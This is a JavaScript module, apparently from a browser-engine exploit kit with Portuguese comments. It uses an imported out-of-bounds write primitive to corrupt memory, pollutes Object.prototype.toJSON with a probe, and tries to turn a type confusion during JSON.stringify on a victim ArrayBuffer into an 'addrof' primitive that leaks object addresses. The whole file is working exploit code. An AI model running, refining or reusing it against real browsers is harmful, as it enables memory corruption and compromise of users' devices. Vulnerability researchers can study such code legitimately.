// js/script3/testArrayBufferVictimCrash.mjs (V1.3 - Simplified Probe, Logging Fix)
import { logS3, PAUSE_S3, SHORT_PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    oob_write_absolute,
    clearOOBEnvironment,
    isOOBReady
} from '../core_exploit.mjs';

export const FNAME_MODULE_V28 = "OriginalHeisenbug_Addrof_V1_3_CatchLastType";

const CRITICAL_OOB_WRITE_VALUE = 0xFFFFFFFF;
const VICTIM_AB_SIZE = 64;

let toJSON_call_details_v1_3 = {};
let object_to_leak_for_addrof_attempt = null;
let victim_ab_ref_for_original_test = null;
let float64_view_ref_for_final_check = null;
let probeInvocationCounter_v1_3 = 0;

export async function executeArrayBufferVictimCrashTest() {
    const FNAME_CURRENT_TEST = `${FNAME_MODULE_V28}.triggerAndAddrof`;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST}: V1.3 CatchLastType Probe ---`, "test", FNAME_CURRENT_TEST);
    document.title = `${FNAME_MODULE_V28} Inic...`;

    probeInvocationCounter_v1_3 = 0;
    toJSON_call_details_v1_3 = {
        probe_variant: FNAME_MODULE_V28,
        // Este campo será o tipo do 'this' na ÚLTIMA vez que a sonda foi chamada.
        type_of_last_this_in_probe: "N/A",
        // Este campo será o tipo do victim_ab na última vez que a sonda o viu.
        type_of_victim_ab_last_seen: "N/A_VictimNotSeen",
        error_in_probe: null,
        probe_invocations: 0, // Total de chamadas da sonda
        victim_ab_seen_by_probe: false,
        addrof_write_attempted_on_victim: false
    };

    victim_ab_ref_for_original_test = null;
    float64_view_ref_for_final_check = null;
    object_to_leak_for_addrof_attempt = { marker: Date.now(), id: "MyTargetObject_V1_3" };

    let errorCapturedMain = null;
    let stringifyOutput = null; // This will hold the RETURN value of the toJSON probe
    const fill_pattern_v1_3 = 0.123456789101112;

    let addrof_result = {
        success: false,
        leaked_address_as_double: null,
        leaked_address_as_int64: null,
        message: "Addrof não tentado ou Heisenbug não ocorreu."
    };

    const corruptionTargetOffsetInOOBAB = 0x7C;

    try {
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) { throw new Error("OOB Init falhou."); }
        logS3("Ambiente OOB inicializado.", "info", FNAME_CURRENT_TEST);

        logS3(`PASSO 1: Escrevendo valor CRÍTICO ${toHex(CRITICAL_OOB_WRITE_VALUE)} em oob_array_buffer_real[${toHex(corruptionTargetOffsetInOOBAB)}]...`, "warn", FNAME_CURRENT_TEST);
        oob_write_absolute(corruptionTargetOffsetInOOBAB, CRITICAL_OOB_WRITE_VALUE, 4);
        logS3(`  Escrita OOB crítica realizada.`, "info", FNAME_CURRENT_TEST);

        await PAUSE_S3(100);

        victim_ab_ref_for_original_test = new ArrayBuffer(VICTIM_AB_SIZE);
        float64_view_ref_for_final_check = new Float64Array(victim_ab_ref_for_original_test);
        float64_view_ref_for_final_check.fill(fill_pattern_v1_3);
        logS3(`PASSO 2: victim_ab criado. View preenchida com ${float64_view_ref_for_final_check[0]}.`, "test", FNAME_CURRENT_TEST);

        const ppKey = 'toJSON';
        let originalToJSONDescriptor = Object.getOwnPropertyDescriptor(Object.prototype, ppKey);
        let pollutionApplied = false;

        try {
            Object.defineProperty(Object.prototype, ppKey, {
                value: function Probe_V1_3_CatchLastType_toJSON() {
                    probeInvocationCounter_v1_3++;
                    toJSON_call_details_v1_3.probe_invocations = probeInvocationCounter_v1_3;
                    const current_type = Object.prototype.toString.call(this);
                    
                    // Sempre atualiza o tipo do 'this' da última invocação
                    toJSON_call_details_v1_3.type_of_last_this_in_probe = current_type;
                    logS3(`[Probe_V1_3 Inv#${probeInvocationCounter_v1_3}] 'this' tipo: ${current_type}. É victim_ab: ${this === victim_ab_ref_for_original_test}`, "leak");

                    if (this === victim_ab_ref_for_original_test) {
                        toJSON_call_details_v1_3.victim_ab_seen_by_probe = true;
                        toJSON_call_details_v1_3.type_of_victim_ab_last_seen = current_type; // Tipo do victim_ab nesta chamada

                        if (current_type === '[object Object]' && object_to_leak_for_addrof_attempt) {
                            logS3(`[Probe_V1_3 Inv#${probeInvocationCounter_v1_3}] VICTIM_AB É [object Object]! Tentando escrita...`, "vuln");
                            try {
                                this[0] = object_to_leak_for_addrof_attempt;
                                toJSON_call_details_v1_3.addrof_write_attempted_on_victim = true;
                                logS3(`[Probe_V1_3 Inv#${probeInvocationCounter_v1_3}] Escrita em victim_ab realizada.`, "info");
                            } catch (e_write) {
                                toJSON_call_details_v1_3.error_in_probe = `VictimWriteAttemptError: ${e_write.name}: ${e_write.message}`;
                                logS3(`[Probe_V1_3 Inv#${probeInvocationCounter_v1_3}] ERRO escrita em victim_ab: ${e_write.message}`, "error");
                            }
                        }
                    }
                    return { minimal_probe_V1_3_executed_inv: probeInvocationCounter_v1_3 };
                },
                writable: true, configurable: true, enumerable: false
            });
            pollutionApplied = true;
            logS3(`  Object.prototype.${ppKey} poluído com sonda V1.3.`, "info", FNAME_CURRENT_TEST);

            logS3(`  Chamando JSON.stringify(victim_ab_ref_for_original_test)...`, "warn", FNAME_CURRENT_TEST);
            // stringifyOutput conterá o que a ÚLTIMA invocação de toJSON retornou, se houver múltiplas.
            stringifyOutput = JSON.stringify(victim_ab_ref_for_original_test);

            logS3(`  JSON.stringify completou. Retorno da sonda (última chamada): ${stringifyOutput ? JSON.stringify(stringifyOutput) : 'N/A'}`, "info", FNAME_CURRENT_TEST);
            // *** CORREÇÃO DO LOG AQUI ***
            logS3(`  Detalhes GLOBAIS da sonda (toJSON_call_details_v1_3): ${toJSON_call_details_v1_3 ? JSON.stringify(toJSON_call_details_v1_3) : 'N/A'}`, "leak", FNAME_CURRENT_TEST);

            if (toJSON_call_details_v1_3.addrof_write_attempted_on_victim) {
                logS3("PASSO 3: Verificando buffer APÓS escrita tentada na sonda...", "warn", FNAME_CURRENT_TEST);
                const value_read_as_double = float64_view_ref_for_final_check[0];
                addrof_result.leaked_address_as_double = value_read_as_double;
                logS3(`  Valor lido: ${value_read_as_double}`, "leak", FNAME_CURRENT_TEST);
                // ... (lógica de conversão e verificação do Int64)
                const buf = new ArrayBuffer(8); const dv = new Float64Array(buf); const u32 = new Uint32Array(buf);
                dv[0] = value_read_as_double; addrof_result.leaked_address_as_int64 = new AdvancedInt64(u32[0], u32[1]);
                logS3(`  Interpretado como Int64: ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak");

                if (value_read_as_double !== 0 && Math.abs(value_read_as_double - fill_pattern_v1_3) > 1e-9 &&
                    (addrof_result.leaked_address_as_int64.high() < 0x00020000 || (addrof_result.leaked_address_as_int64.high() & 0xFFFF0000) === 0xFFFF0000) ) {
                    logS3("  !!!! VALOR LIDO PARECE UM PONTEIRO POTENCIAL (addrof) !!!!", "vuln", FNAME_CURRENT_TEST);
                    addrof_result.success = true;
                    addrof_result.message = "TC na sonda OK, escrita tentada E VALOR DO BUFFER MUDOU.";
                    document.title = `${FNAME_MODULE_V28}: Addr? ${addrof_result.leaked_address_as_int64.toString(true)}`;
                } else {
                    addrof_result.message = "TC na sonda OK, escrita tentada, mas valor do buffer não mudou/não parece ponteiro.";
                    if (Math.abs(value_read_as_double - fill_pattern_v1_3) < 1e-9) addrof_result.message += " (Buffer não alterado)";
                    logS3(`  INFO: ${addrof_result.message} (Valor lido: ${value_read_as_double})`, "warn", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: TC Probe OK, AddrVal FAIL`;
                }
            } else { // addrof_write_attempted_on_victim é false
                if (toJSON_call_details_v1_3.type_of_victim_ab_last_seen === '[object Object]') {
                     addrof_result.message = "Type Confusion para [object Object] observada no victim_ab, mas escrita não foi tentada (tipo não era [object Object] no momento da checagem na sonda).";
                     logS3(`  INFO (Replicando Log de Referência?): ${addrof_result.message}`, "warn", FNAME_CURRENT_TEST);
                     document.title = `${FNAME_MODULE_V28}: TC Victim OK, AddrWrite SKIPPED`;
                } else {
                    addrof_result.message = "Escrita no victim_ab não tentada. TC no victim_ab: ${toJSON_call_details_v1_3.type_of_victim_ab_last_seen}.";
                    logS3(`  ALERTA: ${addrof_result.message}`, "error", FNAME_CURRENT_TEST);
                    document.title = `${FNAME_MODULE_V28}: No TC Victim, VictimWrite SKIPPED`;
                }
            }

        } catch (e_str) {
            errorCapturedMain = e_str;
            logS3(`  ERRO CRÍTICO durante JSON.stringify: ${e_str.name} - ${e_str.message}`, "critical", FNAME_CURRENT_TEST);
            document.title = `${FNAME_MODULE_V28}: Stringify/Probe ERR`;
            addrof_result.message = `Erro na execução (stringify/probe): ${e_str.name} - ${e_str.message}`;
        } finally {
            if (pollutionApplied) {
                if (originalToJSONDescriptor) Object.defineProperty(Object.prototype, ppKey, originalToJSONDescriptor);
                else delete Object.prototype[ppKey];
            }
        }

    } catch (e_outer_main) {
        errorCapturedMain = e_outer_main;
        logS3(`ERRO CRÍTICO GERAL: ${e_outer_main.name} - ${e_outer_main.message}`, "critical", FNAME_CURRENT_TEST);
        if (e_outer_main.stack) { logS3(`Stack: ${e_outer_main.stack}`, "critical", FNAME_CURRENT_TEST); }
        document.title = `${FNAME_MODULE_V28} CRITICAL FAIL`;
        addrof_result.message = `Erro geral: ${e_outer_main.name} - ${e_outer_main.message}`;
    } finally {
        clearOOBEnvironment({ force_clear_even_if_not_setup: true });
        logS3(`--- ${FNAME_CURRENT_TEST} Concluído ---`, "test", FNAME_CURRENT_TEST);
        logS3(`Resultado Addrof: Success=${addrof_result.success}, Msg='${addrof_result.message}'`, addrof_result.success ? "good" : "warn", FNAME_CURRENT_TEST);
        if(addrof_result.leaked_address_as_int64 && addrof_result.success){
            logS3(`  Addrof (Int64): ${addrof_result.leaked_address_as_int64.toString(true)}`, "leak", FNAME_CURRENT_TEST);
        }
        object_to_leak_for_addrof_attempt = null;
        victim_ab_ref_for_original_test = null;
        float64_view_ref_for_final_check = null;
    }
    return {
        errorOccurred: errorCapturedMain,
        potentiallyCrashed: false,
        stringifyResult: stringifyOutput,
        toJSON_details: toJSON_call_details_v1_3,
        addrof_attempt_result: addrof_result
    };
}
